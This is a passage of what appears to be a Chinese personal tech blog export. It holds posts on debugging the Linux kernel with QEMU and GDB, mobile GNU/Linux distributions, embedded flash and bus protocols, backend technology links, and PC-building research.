可知，open系统调用的入口位于fs/open.c的第1331行：\n1 2 3 4 5 6 SYSCALL_DEFINE3(open, const char __user *, filename, int, flags, umode_t, mode) { if (force_o_largefile()) flags |= O_LARGEFILE; return do_sys_open(AT_FDCWD, filename, flags, mode); } 由此进一步可知，open系统调用的实现函数为do_sys_open。\nLinux Kernel 系统调用流程参见：https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-2.html\n动态调试 继续以open系统调用为例，开始动态调试跟踪。\nqemu monitor，你的好帮手，Ctrl+A C进入与退出monitor模式：\nhttps://www.qemu.org/docs/master/system/monitor.html https://en.wikibooks.org/wiki/QEMU/Monitor 这里使用qemu monitor模式开启调试。使用qemu启动内核：\n1 2 3 4 5 qemu-system-x86_64 -m 512 \\ -kernel arch/x86_64/boot/bzImage \\ -append \u0026#34;console=ttyS0 nokaslr\u0026#34; \\ -initrd ramdisk.img \\ -nographic 启动完成得到shell后，Ctrl+A C进入与退出monitor模式：\n1 2 3 4 5 6 7 8 9 (initramfs) ls dev bin init lib64 sbin var tmp root conf lib libx32 scripts sys kernel etc lib32 run usr proc # Ctrl+A C (qemu) gdbserver Waiting for gdb connection on device \u0026#39;tcp::1234\u0026#39; # Ctrl+A C (initramfs) 使用gdb连接:1234即可开始调试：\n1 gdb vmlinux -ex \u0026#34;target remote :1234\u0026#34; 此前已经知道open系统调用的实现函数为do_sys_open，故于此函数下断点即可。\n内存管理 文件系统 网络栈 实战漏洞调试 参见：https://cerr.cc/post/cve-2016-5195-linux-dirtycow漏洞分析/\n参考 http://nickdesaulniers.github.io/blog/2018/10/24/booting-a-custom-linux-kernel-in-qemu-and-debugging-it-with-gdb/ https://kiprey.github.io/2021/10/kernel_pwn_introduction/ ","date":"2022-08-08T14:17:44+08:00","image":"https://s2.loli.net/2022/08/09/PKcwjiVBTg6ApEv.png","permalink":"https://cerr.cc/post/%E4%BD%BF%E7%94%A8qemu-gdb%E8%B0%83%E8%AF%95linux%E5%86%85%E6%A0%B8/","title":"使用QEMU+GDB调试Linux内核"},{"content":"快递还在路上…… 话说我大学专业之所以选了计算机，除去高二于学霸本联想G510上玩过《看门狗》的原因外，就是因为有着折腾二手安卓机的爱好了。这一兴趣一直延续到了大学，以至于我童叟无欺的闲鱼账号被人怀疑为是机贩子账号 （😤是可忍，孰不可忍） 。直至大三开始搞到了外快，可以不再为一台多次易主的设备在经济上精打细算，便渐渐失去了往日的激情。果然太容易得到的东西，就会失宠。\n还记得大二那次Essential Phone换LG V30的交易，在我和那位小米前员工约定的地铁站内，他说，从我身上仿佛看见了当年的他，为一台心心念念的破旧设备奔波几十里却满心欢喜。两名垃机佬相视一笑，心照不宣，你东我西，从此再无交集……（😭\nLinux On a Phone 啥说是手机上的Linux？安卓的内核本来就是Linux呀？！\n但那是Android/Linux，而我们本次的目标是GNU/Linux，将mainline kernel与GNU utils运行与手机之上。可以比喻成将手机刷成了一台运行了桌面级系统的小主机？\n关于Android的Linux内核与mainline Linux内核的关系，参见Google的说明：https://source.android.com/devices/architecture/kernel?hl=zh-cn\n有若干项目试图接近这个目标，其中最有名的应该还是Ubuntu Touch了。但经过一些调研后，我发现Ubuntu Touch并不是我满意的选择……\nUbuntu Touch https://ubuntu-touch.io/\nUbuntu Touch借助了Haium以解决纷繁复杂的硬件驱动支持问题，虽然由此达成了将GNU utils无缝运行于移动设备的目的，但却也因此被迫舍弃了mainline kernel。具体技术架构参见https://halium.org/即可。\n似乎Ubuntu Touch的定位主要瞄准了Android，而非作为一个完全可定制的极客OS，所以在包管理、分区读写等方面并不能做到如同Ubuntu desktop一样的体验。再加上其没有使用mainline kernel不符合我的需求，故而弃之。\nMobian https://mobian.org/\nhttps://wiki.mobian.org/\nMobian，即mobile debian，好的地方在于其已为大家广泛熟悉的apt+dpkg包管理工具和软件源，且其使用了mainline内核。但缺乏对于大量设备的支持。Mobian的设备支持列表在这里：https://wiki.mobian.org/doku.php?id=devices。可以看到除去几款国内难以购买、价格高昂、配置低下的开源手机外，就只有一加6和小米Pocophone F1两款骁龙845机型了。\nDroidian https://droidian.org/\nMobian的Haium版本，借由和Ubuntu Touch类似的方案，达成支持更多设备的目的。但也因此放弃了mainline kernel。\npostmarketOS https://postmarketos.org/\npostmarketOS基于Alpine Linux，为busybox + musl libc的解决方案。在采用mainline kernel的mobile发行版中社区最大，维护最活跃。其支持的设备列表与支持情况可以于此查到：https://wiki.postmarketos.org/wiki/Devices\n以我手上的Xiaomi Mi Note2为例，对其的许多驱动支持是postmarketOS独一份的，比如此前修复的Wi-Fi模块：https://gitlab.com/postmarketOS/pmaports/-/merge_requests/3271\npostmarketOS集成了几乎所有为mobile生态做出努力的上层桌面环境：https://wiki.postmarketos.org/wiki/Category:Interface。且与软件源中提供了一键安装与切换。不同设备所适合的DE并不同，我此前的Xiaomi Redmi2使用KDE Plasma mobile最舒适，而现在手上这台Xiaomi Mi Note2运行Phosh才最稳定。\n其亦有国内软件源镜像的支持：https://mirrors.tuna.tsinghua.edu.cn/postmarketOS/\n换源说明：https://mirrors.tuna.tsinghua.edu.cn/help/postmarketOS/\n将软件源由特定发行版切换到master分支后，即相当于将系统转化为滚动更新模式。这样做的好处是，昨天上报的bug可能今天就被修复了，下游设备立即执行apk update; apk upgrade即可立即获取修复的更新。缺点则是是master分支的不稳定。但考虑到mobile发行版的可用性与稳定性本身就堪忧，切换至滚动更新，或许是牺牲1份稳定性，换取5分可用性。在我看来是很划算的生意。\n其余暂未进一步了解的Mobile Distros Sailfish OS https://sailfishos.org/\n体量貌似也很大，但其官网首页就是标价，预感不妙，逃……\nLuneOS http://www.webos-ports.org/wiki/Main_Page\n也是Haium方案。\nPureOS、Manjaro ARM等 https://pureos.net/\nhttps://manjaro.org/\n其定位并非为移动端努力。只能说是支持了Pine Phone等开源手机而已。\n关于刷机 参考https://cerr.cc/post/android搞机笔记/\nXiaomi Mi Note2 ","date":"2022-07-19T10:50:06+08:00","image":"https://postmarketos.org/static/img/nexus5-bg-dark.jpg","permalink":"https://cerr.cc/post/%E6%89%8B%E6%9C%BA%E5%8F%98%E8%BA%AB%E5%B0%8F%E4%B8%BB%E6%9C%BA/","title":"手机变身小主机？！"},{"content":" 物联网安全是离不开硬件领域的。而计算机科学与技术专业出身的我，嵌入式知识实属匮乏。公司组内有大量免费玩具却不会玩，这口气实在难以下咽。接下来是对自己嵌入式硬件知识的早教记录。\nPCB https://en.wikipedia.org/wiki/Printed_circuit_board\n处理器 MCU https://en.wikipedia.org/wiki/Microcontroller STM32 https://en.wikipedia.org/wiki/STM32 IICEEPROM IICEEPROM，采用的是IIC通信协议。\nIIC通信协议具有的特点：简单的两条总线线路，一条串行数据线（SDA），一条串行时钟线（SCL）；串行半双工通信模式的8位双向数据传输，位速率标准模式下可达100Kbit/s；一种电可擦除可编程只读存储器，掉电后数据不丢失，由于芯片能够支持单字节擦写，且支持擦除的次数非常之多，一个地址位可重复擦写的理论值为100万次，常用芯片型号有AT24C02、FM24C02、CAT24C02等，其常见的封装多为DIP8，SOP8，TSSOP8等。\nFlash https://en.wikipedia.org/wiki/Flash_memory https://nieyong.github.io/wiki_ny/Flash.html 在嵌入式设备中，由于其存储的简便性和小空间、高利用率、高稳定性等需求，要求一种特殊的存储介质来存储嵌入式固件。在过去的嵌入式设备中，EPROM和EEPROM是存储介质的主流产品，而目前flash存储介质已经占据了嵌入式存储市场的主流。按照其内部架构和实现技术主要分AND、NAND、NOR、DiNOR四种，其中NOR和NAND为flash的主流产品。\n固件存储介质具有自身的数据存储、访问机制，用户对数据的访问也需要一套机制。为了实现上层对数据访问的有效性和透明性，底层的存储机制和上层的访问机制之间就需要一个接口，这就是存储技术驱动程序（MTD）。驱动程序用来实现对存储单元的管理，实现由逻辑结构到物理结构操作的透明映射，同时也包括坏块处理、损耗平衡等。\nNOR Flash NORflash基本操作的最小单位为块，大小为64K-256K字节，一般是128K字节。每个块首部有记录信息，其余部分又可划分为多个扇区，每个扇区的大小一般为512字节。NORflash由于具有片内执行功能（XIP），所以经常用在数据处理模块。由于价格比较昂贵，体积较大，所以存储量也相对较小，一般来说NOR的容量在1M字节到32M字节之间。\nNORflash是一个类似于RAM的随机访问存储设备。其地址引脚可以映射到存储介质的整个区间，并随机访问其中的每一个字节。NORflash读写操作一般采用512字节的块。为了降低费用、克服一些物理方面的限制，flash存储设备被分为多个块。数据的写入是以块为单位的，在写入数据块之前必须对相应的块进行擦除。NORflash在块擦除之前必须把块中所有的存储位置0，每次擦除的容量以64-128KB的块为单位，导致数据写入过程中耗时较长，块擦除的时间大约为5s。NORflash具有片内执行功能（XIP），而且还具有较高的读速度。但是它的存储空间较小，而且写速度和擦除速度较慢。一般用来存储片内执行程序。\nNORFlash有并行和串行两种，串行一般是SOP封装，使用SPI协议。并行只有极少数BGA封装，一般是TSOP封装，TSOP-56,TFBGA-56,LFBGA-64。\nNORFlash支持随机访问，因此擦除单位是Byte。这里指的是并行信号引脚，NOR的信号线和SRAM基本上是一样的。如果飞线会特别麻烦。\nSPINorFlash SPINorFlash，采用的是SPI通信协议。有4线（时钟，两个数据线，片选线）或者3线（时钟，两个数据线）通信接口，由于它有两个数据线能实现全双工通信，因此比IIC通信协议的IICEEPROM的读写速度上要快很多。SPINorFlash具有NOR技术FlashMemory的特点，即程序和数据可存放在同一芯片上，拥有独立的数据总线和地址总线，能快速随机读取，允许系统直接从Flash中读取代码执行；可以单字节或单字编程，但不能单字节擦除，必须以Sector为单位或对整片执行擦除操作，在对存储器进行重新编程之前需要对Sector或整片进行预编程和擦除操作。\nNorFlash在擦写次数上远远达不到IICEEPROM，并且由于NOR技术FlashMemory的擦除和编程速度较慢，块尺寸又较大，因此擦除和编程操作所花费的时间会很长；但SPINorFlash接口简单，使用的引脚少，易于连接，操作方便，并且可以在芯片上直接运行代码，其稳定性出色，传输速率高，在小容量时具有很高的性价比，这使其很适合应于嵌入式系统中作为FLASHROM，所以在市场的占用率非常高。\n常见到的S25FL128、MX25L1605、W25Q64等型号都是SPINorFlash，其常见的封装多为SOP8，SOP16，WSON8，US0N8，QFN8、BGA24等\nParallelNorFalsh（CFIFlash） ParallelNorFalsh，也叫做并行NorFlash，采用的Parallel接口通信协议。拥有独立的数据线和地址总线，它同样继承了NOR技术FlashMemory的所有特点；由于采用了Parallel接口，ParallelNorFalsh相对于SPINorFlash，支持的容量更大，读写的速度更快，但是由于占用的地址线和数据线太多，在电路电子设计上会占用很多资源。ParallelNorFalsh读写时序类似于SRAM，只是写的次数较少，速度也慢，由于其读时序类似于SRAM，读地址也是线性结构，所以多用于不需要经常更改程序代码的数据存储。\n常见到的S29GL128、MX29GL512、SST39VF020等型号都是ParallelNorFlash，其常见的封装多为TSSOP32、TSOP48、BGA64，PLCC32等。\nNAND Flash NANDFlash属于非易失性存储器，对于嵌入式设备，一般使用SLC，单位是1-bit，是一种浮栅结构，可以捕获电子并且外部绝缘，断电之后可以保留数据。Flash都不支持覆盖，即写入操作只能在空或已擦除的单元内进行。擦除方法是在源极加正电压利用第一级浮空栅与漏极之间的隧道效应，将注入到浮空栅的负电荷吸引到源极。由于利用源极加正电压擦除，因此各单元的源极联在一起，这样，擦除不能按字节擦除，而是全片或者分块擦除。\nNANDflash一般来说分为多个区，区是在逻辑层面的概念，不涉及物理层。一个区是由多个块组成的，一般为256-1024个。块是由多个页组成的，页的大小通常是512字节的倍数，一般为512字节。每一页又分为两部分，一部分是主数据区，另一部分是冗余区。主数据区内存储数据部分，冗余区内存储校验信息，用于检测是否出现坏块。\nNANDflash富有效率的架构设计使得相同容量下其单元器件的大小仅相当于NORflash的一半，生产工艺简单更是让NANDflash在相同大小的器件上提供更强大的密集度和存储容量。一般来说NANDflash的存储容量在16M字节和512M字节之间。\nNANDflash是通过复杂的I/O接口进行通信，具体使用8个引脚传送地址、控制等信号，而且接口标准不统一，数据每次存取量一般512字节。NANDflash这种结构一般适用于对数据的存储。\nNANDflash也是被分为多个块，数据的写入是以块为单位的，在写入数据块之前必须对相应的块进行擦除。每次擦除的容量是以8-32KB的块为单位，擦除时间大约为4ms。这就使得其读写速度较NORflash快很多NANDflash设计了一种高密度和大容量单元存储方式，而且擦除过程比较快，写速度比NOR要快的多。单纯的NAND存储设备主要用来进行数据存储，如果设备内部有片内执行代码则一般来说会存储在NOR中。\nONFI标准定义了一些常用的NAND封装，NANDFlash一般是TSOP和BGA的封装，都使用SMT的贴装方式。\nParallelNandFlash ParallelNandFlash同样采用了Parallel接口通信协议，NandFlash在工艺制程方面分有三种类型：SLC、MLC、TLC。\nNandFlash技术FlashMemory具有以下特点：以页为单位进行读和编程操作，以块为单位进行擦除操作；具有快编程和快擦除的功能，其块擦除时间是2ms，而NOR技术的块擦除时间达到几百ms；芯片尺寸小，引脚少，是位成本（bitcost）最低的固态存储器;芯片包含有坏块，其数目取决于存储器密度。坏块不会影响有效块的性能，但设计者需要有一套的坏块管理策略。\n对比ParallelNorFalsh，NandFlash在擦除、读写方面，速度快，使用擦写次数更多，并且它强调更高的性能，更低的成本，更小的体积，更大的容量，更长的使用寿命。这使NandFlash很擅于存储纯资料或数据等，在嵌入式系统中用来支持文件系统。其主要用来数据存储，大部分的U盘都是使用NandFlash，当前NandFlash在嵌入式产品中应用仍然极为广泛，因此坏块管理、掉电保护等措施就需要依赖NandFlash使用厂家通过软件进行完善。\n常见到的S34ML01G100、MX30LF2G18AC、MT29F4G08ABADA等型号都是ParallelNandFlash，其常见的封装多为TSOP48、BGA63、BGA107，BGA137等。\nSPINandFlash SPINandFlash，采用了SPINorFlash一样的SPI的通信协议，在读写的速度上没什么区别，但在存储结构上却采用了与ParallelNandFlash相同的结构，所以SPInand相对于SPInorFlash具有擦写的次数多，擦写速度快的优势，但是在使用以及使用过程中会同样跟ParallelNandFlash一样会出现坏块，因此，也需要做特殊坏块处理才能使用。\nSPINandFlash相对比ParallelNandFlash还有一个重要的特点，那就是芯片自己有内部ECC纠错模块，用户无需再使用ECC算法计算纠错，用户可以在系统应用当中可以简化代码，简单操作。\n常见到的W25N01GVZEIG、GD5F4GQ4UBYIG、F50L1G41A等型号都是SPINandFlash，其常见的封装多为QFN8、BGA24等。\nMMC MultiMediaCard\nhttps://en.wikipedia.org/wiki/MultiMediaCard\neMMC https://en.wikipedia.org/wiki/MultiMediaCard#eMMC\neMMC采用统一的MMC标准接口，自身集成MMCController，存储单元与NandFlash相同。针对Flash的特性，eMMC产品内部已经包含了Flash管理技术，包括错误探测和纠正，Flash平均擦写，坏块管理，掉电保护等技术。MMC接口速度高达每秒52MBytes，eMMC具有快速、可升级的性能，同时其接口电压可以是1.8v或者是3.3v。\neMMC相当于NandFlash+主控IC，对外的接口协议与SD、TF卡一样，主要是针对手机或平板电脑等产品的内嵌式存储器标准规格。eMMC的一个明显优势是在封装中集成了一个控制器，它提供标准接口并管理闪存，使得手机厂商就能专注于产品开发的其它部分，并缩短向市场推出产品的时间。这些特点对于希望通过缩小光刻尺寸和降低成本的NAND供应商来说，同样的重要。\neMMC由一个嵌入式存储解决方案组成，带有MMC（多媒体卡）接口、快闪存储器设备（NandFlash）及主控制器，所有都在一个小型的BGA封装，最常见的有BGA153封装;我们通常见到的KLMAG8DEDD、THGBMAG8B4JBAIM、EMMC04G-S100等型号都是eMMCFlash。eMMCFlash存储容量大，市场上32GByte容量都常见了，其常见的封装多为BGA153、BGA169、BGA100等。\nUFS https://en.wikipedia.org/wiki/Universal_Flash_Storage 芯片封装 https://www.sohu.com/a/158654863_609521\nhttps://www.youtube.com/watch?v=2ua8PeP9ql4\u0026amp;t=153s\nhttps://zhuanlan.zhihu.com/p/509647754\nhttps://semiwiki.com/semiconductor-services/308968-semiconductor-packaging-history-primer/\n协议 UART https://zh.wikipedia.org/zh-cn/UART RS232 https://zh.wikipedia.org/zh-cn/RS-232 I2C https://zh.wikipedia.org/wiki/I%C2%B2C JTAG https://en.wikipedia.org/wiki/JTAG https://www.xjtag.com/zh-hans/about-jtag/what-is-jtag/ https://iot-security.wiki/hardware-security/debug/jtag.html SPI TF/SD SD卡的内部结构如下图所示，可区分为slave卡控制器（Card Controller）、卡寄存器组、内存控制器（Memory Controller）和内存（Memory Chip）4部分。\nslave卡控制器主要完成以下功能∶\n（1）接收卡HOST控制器发送的指令，并进行指令拆包，返回相应的响应；\n（2）接收卡HOST控制器发送数据，并对数据进行拆包，返回相应的响应；\n（3）接收内存控制器发送的数据，根据SD3.0协议，对数据进行打包，将其发送给卡HOST控制器。\n（4）通知内存控制器接收由卡HOST控制器发送的、已经被拆包的数据。\n卡寄存器组内存放卡支持的特性或者参数，可通过特定的指令进行读取。SD3.0协议定义了8个寄存器用来作为存储卡与SD卡HOST控制器交互的接口，包括4个描述卡片详细信息的寄存器（OCR、CID、SCR、CSD）、2个配置寄存器（RCA、DSR）、2个描述强制型的卡状态信息寄存器（SSR、CS）。通过专用命令可访问这些寄存器，获得卡支持的特性或者设置参数。\n内存控制器完成对内存的读写。内存完成对数据的存储。\nTF卡采用SD卡架构，读写协议与SD卡一致，但只有一根地线，其它针脚与SD卡相同。TF卡和SD卡的针脚对应关系如下图所示。\nSD工作模式\nSD卡有两种工作模式∶SD模式和SPI模式。其中SD模式允许4条数据线并行工作，主要应用于对数据传输速率要求较高的场合；而SPI模式仅能单数据线传输，传输速度较慢。在SD/TF卡上电之后，可通过发送特定的指令，将卡置于某种工作模式。\n（1）SD模式\nSD模式是一种异步串行通信接口模式。在SD工作模式下，CMD引脚为双向的命令/响应信号，从该CMD线上串行传输，命令可以以单机寻址（寻址命令）或呼叫所有卡（广播命令）方式发送；响应是对之前命令的回答，可以来自单机或所有卡；DATO～3为4个双向的数据信号。\nSD模式的总线拓扑结构为如下图所示。所有卡使用公共的时钟CLK、电源Vss和地信号Vpp，独立的命令总线（CMD）和数据总线（DAT0~DAT3）。上电后，SD卡默认使用DATO，主机可以通过初始化来改变线宽。但是，各个SD卡不能共用命令、回复和数据（DATO～3）。\nSPI模式\nSPI（Serial Peripheral Interface，串行外设接口）模式是一种同步串行通信模式，使用4个信号线∶串行时钟线（SCK）、主机输入/从机输出线（DO）、主机输出/从机输入线（DI）和使能信号线（CS）。\nSPI模式的总线允许通过2通道（数据输入和输出）传输数据，其拓扑结构如下图所示。当SPI总线上挂接N张卡时，需要N个CS片选信号。SPI模式相对于SD模式的不足之处是速度偏低。\nSD卡启动时，默认采用SD模式。它将在CS信号有效（低电平）时接收一个复位命令（CMD0）来进入SPI模式。如果该卡认为必须停留在SD模式，那么它将不应答这个命令并继续保持在SD模式。如果可以转换到SPI模式，则会转换到SPI模式并用SPI模式的RI应答来回应，而让卡返回SD模式的唯一办法是重新加电。SPI模式下，默认的命令结构/协议CRC检查是失效的。由于卡在电源开启时总是处于SD模式，CMDO命令必须附带一个合法的CRC字节（即使这个命令使用了SPI结构来发送）。一旦进入SPI总线模式，CRC就被默认为失效。\n工具 逻辑分析仪 https://en.wikipedia.org/wiki/Logic_analyzer https://zhuanlan.zhihu.com/p/94386957 https://www.anquanke.com/post/id/276280 一款逻辑分析仪的样本：\nhttp://www.qdkingst.com/cn http://res.kingst.site/kfs/doc/Kingst%e9%87%91%e6%80%9d%e7%89%b9%e8%99%9a%e6%8b%9f%e4%bb%aa%e5%99%a8%e4%bd%bf%e7%94%a8%e6%89%8b%e5%86%8c.pdf 姿势 固件提取 https://www.anquanke.com/post/id/227285 硬件调试 https://www.riverloopsecurity.com/blog/2020/01/hw-101-uart/ ","date":"2022-07-08T14:11:35+08:00","image":"https://pic1.zhimg.com/v2-983af8971091bf560af2e2299d801cd1_1440w.jpg","permalink":"https://cerr.cc/post/zkv%E5%AF%B9%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%A1%AC%E4%BB%B6%E7%9A%84%E6%B5%85%E5%B0%9D%E4%B8%8D%E6%AD%A2/","title":"ZKV对嵌入式硬件的浅尝不止"},{"content":"TODO：\noauth https://oauth.net/ s3-pika restful https://restfulapi.net/ 概念 总览 https://www.redhat.com/zh/topics 云原生 https://www.redhat.com/zh/topics/cloud-native-apps 分布式 CAP理论 在计算机科学中, CAP定理（CAP theorem）, 又被称作 布鲁尔定理（Brewer\u0026rsquo;s theorem）, 它指出对于一个分布式计算系统来说，不可能同时满足以下三点:\n一致性(Consistency) (所有节点在同一时间具有相同的数据) 可用性(Availability) (保证每个请求不管成功或者失败都有响应) 分隔容忍(Partition tolerance) (系统中任意信息的丢失或失败不会影响系统的继续运作) CAP理论的核心是：一个分布式系统不可能同时很好的满足一致性，可用性和分区容错性这三个需求，最多只能同时较好的满足两个。\n因此，根据 CAP 原理将 NoSQL 数据库分成了满足 CA 原则、满足 CP 原则和满足 AP 原则三 大类：\nCA - 单点集群，满足一致性，可用性的系统，通常在可扩展性上不太强大。 CP - 满足一致性，分区容忍性的系统，通常性能不是特别高。 AP - 满足可用性，分区容忍性的系统，通常可能对一致性要求低一些。 编码 Go语言 官网：https://go.dev/\n语法：https://go.dev/ref/spec\n计算 技术 LVS https://cloud.tencent.com/developer/article/1657962 https://my.oschina.net/leeypp1/blog/294807?fromerr=xfCehUJY 产品 CentOS reference：\nhttps://en.wikipedia.org/wiki/CentOS https://zhuanlan.zhihu.com/p/337075432 Docker dockerfile https://docs.docker.com/engine/reference/builder/ https://www.runoob.com/docker/docker-dockerfile.html compose https://docs.docker.com/compose/ https://www.runoob.com/docker/docker-compose.html swarm https://docs.docker.com/engine/swarm/ https://www.runoob.com/docker/docker-swarm.html K8s Kubernetes, also known as K8s, is an open-source system for automating deployment, scaling, and management of containerized applications.\nhttps://kubernetes.io/ https://kubernetes.io/docs/concepts/overview/what-is-kubernetes/ https://www.redhat.com/zh/topics/containers/what-is-kubernetes 存储 技术 SQL https://en.wikipedia.org/wiki/SQL\nRAID reference：\nhttps://zh.wikipedia.org/zh-tw/RAID XFS reference：\nhttps://zh.wikipedia.org/zh-tw/XFS NoSQL https://www.runoob.com/mongodb/nosql.html 产品 Amazon S3 官网：https://aws.amazon.com/cn/s3/\nAmazon Simple Storage Service (Amazon S3) 是一种对象存储服务\nReference:\nhttps://zhuanlan.zhihu.com/p/269794747 MongoDB https://www.runoob.com/mongodb/mongodb-tutorial.html elasticsearch https://www.elastic.co/cn/\nhttps://github.com/elastic/elasticsearch https://www.elastic.co/cn/elasticsearch/ Kibana https://www.elastic.co/cn/kibana/\nRedis https://redis.io/docs/about/ https://www.runoob.com/redis/redis-tutorial.html 管理 产品 Apache Hadoop https://hadoop.apache.org/ https://www.runoob.com/w3cnote/hadoop-tutorial.html Apache Zookeeper https://www.runoob.com/w3cnote/zookeeper-tutorial.html Apache Kafka https://www.redhat.com/zh/topics/integration/what-is-apache-kafka Jenkins https://www.jenkins.io/ https://www.liaoxuefeng.com/article/1083282007018592 ","date":"2022-07-04T17:47:35+08:00","image":"https://pic4.zhimg.com/v2-3ec9f9b98b4c3596e09b40d143410f0e_1440w.jpg?source=172ae18b","permalink":"https://cerr.cc/post/zkv%E5%AF%B9%E5%90%8E%E7%AB%AF%E7%9A%84%E6%B5%85%E5%B0%9D%E8%BE%84%E6%AD%A2/","title":"ZKV对后端的浅尝辄止"},{"content":"前传 不同寻常的是，我是在将各种设备都玩过一轮后，最后才将目光放到了台式机上。想来原因应当在于我是一个无可救药的MINI教信徒——iPhone用mini；iPad用mini（曾经，奈何M1太香了）；Macbook用miniAir；台式机用NUC+电脑棒+单片机……\n好吧，其实我也不能说没有台式机，毕竟NUC也算得上。但在把各类小型设备都折腾过一遍后，我陷入了茫然四顾无所寄托的悲惨境地。突然想起自己这几年来竟未尝进入DIY PC的海洋试试水。又瞥了瞥手上这台NUC11PAHi5，估摸着这孩子也是天资平平、前途黯淡，竭尽全力地运行OW1却只是凑活能玩，绝无能带起OW2的天赋。恰逢本世代全球大萧条之始，加密货币市场一泻千里，难窥其底。显卡价格也是应声而落，众望所归。天时地利人和——这钱，我不得不花。毕竟天意不可违。\n但对于村儿里长大的我来说，掏出去的钱倘若没能换来足量的快乐，乃至买来的是糟心，实在是大逆不道有违祖训的事情。其负罪感甚至要甚于倒掉没吃完的肉（或许正因如此我才有幸成为闲鱼大V，焉知非福啊）。所以，事前进行全方位的考察与调研是十分必要的事情。\n通用资源 https://www.zhihu.com/special/1436041011885293568?tab=1436061145295228928 一些排行榜和天梯图：https://rank.kkj.cn/dgpu3.shtml 万物皆可对比：https://versus.com/cn CPU 通用资源 可以于这些网站查询到绝大多数CPU的benchmark：\nhttps://www.cpubenchmark.net/ https://browser.geekbench.com/processor-benchmarks 天梯图：https://www.mydrivers.com/zhuanti/tianti/cpu/index.html\nIntel 命名规则 酷睿后缀名 后缀 含义 G1-G7 显卡级别（仅适用于采用全新集成显卡技术的处理器） E 嵌入式 F 需要独立显卡 G 封装包中包含独立显卡 H 针对移动设备进行优化的高性能 HK 针对移动设备进行优化的高性能，未锁频 HQ 针对移动设备进行优化的高性能，四核 K 未锁频 S 特别版 T 经过功耗优化的生活方式 U 高能效移动设备 Y 极低功耗的移动设备 X/XE 未锁频，高端 B 球栅阵列 (BGA) reference：https://www.intel.com/content/www/us/en/processors/processor-numbers.html\nAMD 命名规则 锐龙后缀名 X后缀\nAMD Ryzen X系列跟Intel的K系列类似，都是强化了超频特性。 K后缀\nK代表解锁倍频，可以超频，如AMD Athlon X4 860K和AMD A10-7870K。 G\nE后缀\nE后缀特指FX系列CPU的节能版，如FX 8370E的频率降低到3.3-4.3GHz，功耗降低到95W（FX8370的规格为4.0-4.3GHz，125W）。 B后缀\nB后缀特指APU的低功耗商务版本，比如A10 PRO-7850B，下限能耗少10W，GPU频率降低。 M后缀\nM系列特指APU的移动版。 显卡 天梯图：https://www.mydrivers.com/zhuanti/tianti/gpu/index.html\n时时刻刻，当心矿卡！写于装机完毕后：\n出于对买到矿卡的担忧，我最终于同事手中购入了他的RX5500XT——一款口碑并不算佳的中低端显卡。想来大不了等下一代显卡发售后，或是真有更高的浮点运算需求后，再升级也不迟。\n然而经过实际游戏测试，我发现这款显卡为我的渣渣75Hz 1080P显示器输出视频信号，简直应付自如。神优化的地平线4满帧率满画质下，显卡占用只有70%出头；荒野大镖客2默认高画质显卡虽满载，但也是满帧流畅；至于显卡杀手Cyberpunk2077，高画质也能流畅。果然只要需求是1080P下玩3A，三位数的中低端显卡即可胜任。\n硬盘 固态硬盘 固态硬盘使用NAND闪存颗粒作为存储的主体，采用主控+多颗闪存芯片的结构。\nNAND闪存颗粒 主要分为SLC、MLC、TLC、QLC四种。寿命和价格都依次递减。\nreference：https://www.kingston.com/cn/blog/pc-performance/difference-between-slc-mlc-tlc-3d-nand\n接口与协议 物理接口 M.2 U.2 AIC NGFF 高速信号协议 SATA Serial Advanced Technology Attachment PCIe Peripheral Component Interconnect Express SAS Serial Attached SCSI 传输层协议 NVMe 专为固态硬盘设计的协议，为NAND做了优化 SCSI ATA 仅与SATA配合 reference：\n了解 SSD 技术：NVMe、SATA、M.2：https://www.kingston.com/cn/community/articledetail/articleid/48543 固态硬盘外形尺寸类型：https://www.kingston.com/cn/blog/pc-performance/ssd-form-factors M.2 固态硬盘的两种类型：SATA 和 NVMe：https://www.kingston.com/cn/blog/pc-performance/two-types-m2-vs-ssd 机械硬盘 存储技术分为 PMR(CMR) 与 SMR，参考如下：\nhttps://kb.synology.cn/zh-cn/DSM/tutorial/PMR_SMR_hard_disk_drives https://zhuanlan.zhihu.com/p/353963603 尺寸分为3.5英寸与2.5英寸。数字虽相差不大，实际体积却相去甚远。\n个人方案 我的方案是：\n单个插到主板M.2口的NVMe 1TB SSD做系统盘，单独分区为C盘。读速在2.8GB/s左右。 一个SMR 6TB 3.5寸 SATA HDD做冷数据存储。读速在150MB/s左右。 一个PMR 1TB 2.5寸 SATA HDD做热数据、FTP、BT数据存储。读速在150MB/s左右。 一个MLC USB SCSI 128GB固态U盘做移动数据存储。读速在450MB/s左右。 主板 先来了解下PCIe。知乎老狼的文章都写的很好哇，推荐他的UEFI与BIOS探秘。\n深入PCI与PCIe之一：硬件篇：https://zhuanlan.zhihu.com/p/26172972 深入PCI与PCIe之二：软件篇：https://zhuanlan.zhihu.com/p/26244141 PCIe中断机制(1):演变历史：https://zhuanlan.zhihu.com/p/399239928 大小分类 大板：ATX、Mini ATX、XL-ATX、非标准E-ATX 小板：MATX、μATX、FlexATX 迷你板：ITX（包括Thin-ITX） 超大板：标准E-ATX、EE-ATX、HPTX、WTX 华硕主板产品线：\n顶尖旗舰 ROG 游戏主流 STRIX 入门电竞 TUF GAMING 与 PRIME reference：\nhttps://www.zhihu.com/question/351825113/answer/1041320836 https://zhuanlan.zhihu.com/p/53379889 内存 硬件形态 在80286时代，内存颗粒（Chip）是直接插在主板上的，叫做DIP(Dual In-line Package)。到了80386时代，换成1片焊有内存颗粒的电路板，叫做SIMM（Single-Inline Memory Module）。由阵脚形态变化成电路板带来了很多好处：模块化，安装便利等等，由此DIY市场才有可能产生。当时SIMM的位宽是32bit，即一个周期读取4个字节，到了奔腾时，位宽变为64bit，即8个字节，于是SIMM就顺势变为DIMM（Double-Inline Memory Module）。这种形态一直延续至今，也是内存条的基本形态。现在DIMM分为很多种：\nRDIMM: 全称（Registered DIMM），寄存型模组，主要用在服务器上，为了增加内存的容量和稳定性分有ECC和无ECC两种，但市场上几乎都是ECC的。 UDIMM：全称（Unbuffered DIMM），无缓冲型模组，这是我们平时所用到的标准台式电脑DIMM，分有ECC和无ECC两种，一般是无ECC的。 SO-DIMM：全称（Small Outline DIMM），小外型DIMM，笔记本电脑中所使用的DIMM，分ECC和无ECC两种。 Mini-DIMM：DDR2时代新出现的模组类型，它是Registered DIMM的缩小版本，用于刀片式服务器等对体积要求苛刻的高端领域。 DDR DDR SDRAM: Double Data Rate Synchronous Dynamic Random Access 